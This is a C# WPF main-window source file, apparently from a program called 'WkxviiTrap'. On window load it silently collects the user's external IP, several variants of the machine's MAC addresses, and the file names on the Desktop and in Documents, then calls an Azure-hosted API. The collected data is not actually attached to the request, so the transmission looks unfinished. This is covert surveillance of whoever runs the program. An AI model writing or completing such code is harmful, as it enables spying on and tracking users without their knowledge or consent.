using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using ThisModels;

namespace WkxviiTrap
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _ = Task.Run(ExecuteAsync);
        }

        private async Task ExecuteAsync()
        {
            HttpClient cli = new()
            {
                BaseAddress = new Uri("https://hosrockcoreappapi20220726175543.azurewebsites.net")
            };

            Class1 class1 = new()
            {
                Info1 = GetExternalIp(),
                Info2 = GetEnderecosFisicos(),
                Info3 = GetEnderecoMAC1(),
                Info4 = GetEnderecoMAC2(),
                Info5 = GetEnderecoMAC3(),
                Info6 = GetEnderecoMAC4(),
                Info7 = GetEnderecoMAC5(),
                Info8 = GetEnderecoMAC6(),
                Info9 = ListDesktopFiles(),
                Info10 = ListMyDocsFiles(),
            };

            var response = await cli.GetAsync("api/main");
        }

        private static string GetExternalIp()
        {
            try
            {
                string externalIpString = new WebClient().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "").Trim();
                return IPAddress.Parse(externalIpString).ToString();
            }
            catch (Exception)
            {
                return null;
            }
        }

        public static string[] GetEnderecosFisicos()
        {
            var resultado = new List<string>();
            try
            {
                NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
                foreach (NetworkInterface adapter in interfaces)
                {
                    PhysicalAddress address = adapter.GetPhysicalAddress();
                    byte[] bytes = address.GetAddressBytes();
                    if (bytes.Length == 0) continue;
                    var mac = new StringBuilder();
                    for (int i = 0; i < bytes.Length; i++)
                    {
                        mac.Append(bytes[i].ToString("X2"));
                        if (i != bytes.Length - 1) mac.Append("-");
                    }
                    resultado.Add(mac.ToString());
                }
                return resultado.ToArray();
            }
            catch (Exception)
            {
                return null;
            }
        }

        public static string GetEnderecoMAC1()
        {
            try
            {
                NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                String enderecoMAC = string.Empty;
                foreach (NetworkInterface adapter in nics)
                {
                    // retorna endereço MAC do primeiro cartão
                    if (enderecoMAC == String.Empty)
                    {
                        IPInterfaceProperties properties = adapter.GetIPProperties();
                        enderecoMAC = adapter.GetPhysicalAddress().ToString();
                    }
                }
                return enderecoMAC;
            }
            catch (Exception)
            {
                return null;
            }
        }
        public static PhysicalAddress GetEnderecoMAC2()
        {
            try
            {
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    // Somente considera interface Ethernet
                    if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                        nic.OperationalStatus == OperationalStatus.Up)
                    {
                        return nic.GetPhysicalAddress();
                    }
                }
                return null;
            }
            catch (Exception)
            {
                return null;
            }
        }
        // usa o namespace System.Management
        // que recupera uma coleção de objetos de gerenciamento 
        // baseada em uma consulta especificada.
        public static string GetEnderecoMAC3()
        {
            try
            {
                ManagementObjectSearcher objMOS = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration");
                ManagementObjectCollection objMOC = objMOS.Get();
                string enderecoMAC = String.Empty;
                foreach (ManagementObject objMO in objMOC)
                {
                    //retorna endereço MAC do primeiro cartão
                    if (enderecoMAC == String.Empty)
                    {
                        if (objMO["MacAddress"] != null)
                            enderecoMAC = objMO["MacAddress"].ToString();
                    }
                    objMO.Dispose();
                }
                enderecoMAC = enderecoMAC.Replace(":", "");
                return enderecoMAC;
            }
            catch (Exception)
            {
                return null;
            }
        }
        public static string GetEnderecoMAC4()
        {
            string enderecoMac = "";
            try
            {
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (nic.NetworkInterfaceType != NetworkInterfaceType.Ethernet) continue;
                    if (nic.OperationalStatus == OperationalStatus.Up)
                    {
                        enderecoMac += nic.GetPhysicalAddress().ToString();
                        break;
                    }
                }
                return enderecoMac;
            }
            catch (Exception)
            {
                return null;
            }
        }
        public static string GetEnderecoMAC5()
        {
            try
            {
                //cria um objeto da classe management usando a classe
                //Win32_NetworkAdapterConfiguration para obter os atributos
                //do adaptador de rede
                ManagementClass mgmt = new ManagementClass("Win32_NetworkAdapterConfiguration");
                //cria a coleção ManagementObjectCollection 
                ManagementObjectCollection objCol = mgmt.GetInstances();
                string address = String.Empty;
                //percorre todos os objetos
                foreach (ManagementObject obj in objCol)
                {
                    if (address == String.Empty)  //retorna somente o valor do primeiro cartão
                    {
                        //pega o valor do primeiro adaptador 
                        if ((bool)obj["IPEnabled"] == true) address = obj["MacAddress"].ToString();
                    }
                    //libera o objeto
                    obj.Dispose();
                }
                address = address.Replace(":", "");
                return address;
            }
            catch (Exception)
            {
                return null;
            }
        }
        public static List<string> GetEnderecoMAC6()
        {
            try
            {
                ManagementObjectSearcher query = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration");
                List<string> adapters = new List<string>();
                foreach (ManagementObject mo in query.Get())
                    if ((bool)mo["IPEnabled"] && mo["MacAddress"] != null)
                    {
                        adapters.Add((string)mo["Description"] + " " + (string)mo["MacAddress"]);
                    }
                return adapters;
            }
            catch (Exception)
            {
                return null;
            }
        }

        private static string[] ListDesktopFiles()
        {
            var desk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            return Directory.GetFiles(desk);
        }

        private static string[] ListMyDocsFiles()
        {
            var doxcs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            return Directory.GetFiles(doxcs);
        }
    }
}
